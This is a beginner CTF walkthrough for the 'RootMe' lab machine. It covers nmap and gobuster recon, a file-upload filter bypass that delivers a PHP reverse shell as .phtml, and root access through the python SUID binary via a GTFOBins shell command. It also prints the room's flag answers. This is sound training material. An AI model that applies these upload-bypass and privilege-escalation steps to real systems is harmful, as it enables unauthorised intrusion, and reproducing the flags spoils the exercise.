# RootMe 

*A CTF for beginners, can you root me?*

*Target Machine = 10.10.56.211*

## Reconnaissance

- Run nmap scan to get port and service information

`sudo nmap -sC -sV -oN nmap-scan 10.10.56.211`

- Run gobuster to get information on web server directories

`gobuster dir -u http://10.10.56.211 -w /usr/share/wordlists/dirb/common.txt | tee web-enum`


>Scan the machine, how many ports are open?
**2**
What version of Apache is running?
**2.4.29**
What service is running on port 22?
**ssh**
What is the hidden directory?
**/panel/**

---

## Getting a shell

- Download a php reverse-shell script online
- Change the IP address in the script and then try to upload the file at _http://10.10.56.211/panel/_ 

you will notice that the file does not upload as it filters for php extensions.

- Use  burp suite to check various extention formats that could work by sending an http upload request to the _intruder_ tab and running a sniper attack againts it.
- You will notice that the _.phtml_ extension works.
    - change the reverse shell file extention to that and re-upload the file. **make sure you have a netcat listener running on the correct port**
    - go to *http://10.10.56.211/uploads/php-reverse-shell.phtml* and a shell should popup in your terminal. (verify using whoami)

- Run the following command to find the user.txt file for the first flag then `cat` to it.

`find -name user.txt 2>/dev/null`


> user.txt
**THM{y0u_g0t_a_sh3ll}**

---

## Privelege Escalation

- Search for files with SUID permission 

`find . -perm /4000`

Scrolling through the results and comparing to what is on [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) /usr/bin/python came back with something useful.

- Run the following commands from GTFOBins to escalate priveleges

```console
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

- verify user and permissions with `id` and `whoami`
- Search for root.txt file

`find -name root.txt 2>/dev/null`

- cat file for root flag.

`cat ./root/root.txt`


>Search for files with SUID permission, which file is weird?
**/usr/bin/python**
root.txt
**THM{pr1v1l3g3_3sc4l4t10n}**